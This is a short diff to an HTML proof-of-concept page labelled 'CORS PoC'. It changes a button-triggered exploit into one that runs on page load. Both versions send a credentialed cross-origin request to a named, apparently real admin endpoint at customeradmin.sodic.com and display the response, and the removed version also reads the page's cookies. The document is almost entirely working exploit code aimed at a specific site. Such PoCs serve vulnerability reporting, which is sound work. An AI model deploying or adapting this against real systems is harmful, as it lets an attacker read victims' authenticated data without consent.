@@ -2,23 +2,16 @@
 <html>
      <body>
          <h2>CORS PoC</h2>
-         <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
-         </div>
-         <script>
-             function cors() {
-                 var xhr = new XMLHttpRequest();
-                 xhr.onreadystatechange = function() {
-                     if (this.readyState == 4 && this.status == 200) {
-                         // Extract and display the cookie value
-                         var cookies = document.cookie;
-                         document.getElementById("demo").innerHTML = alert("Response: " + this.responseText + "\nCookies: " + cookies);
-                     }
-                 };
-                 xhr.open("GET", "https://customeradmin.sodic.com/Maintenance", true);
-                 xhr.withCredentials = true;
-                 xhr.send();
-             }
+          <script>
+              var xhttp = new XMLHttpRequest();
+              xhttp.onreadystatechange = function() {
+                   if (this.readyState == 4 && this.status == 200) {
+                        alert(xhttp.responseText);
+                   }
+              };
+               xhttp.open("GET", "https://customeradmin.sodic.com/Maintenance", true);
+               xhttp.withCredentials=true;
+               xhttp.send();
          </script>
      </body>
  </html>
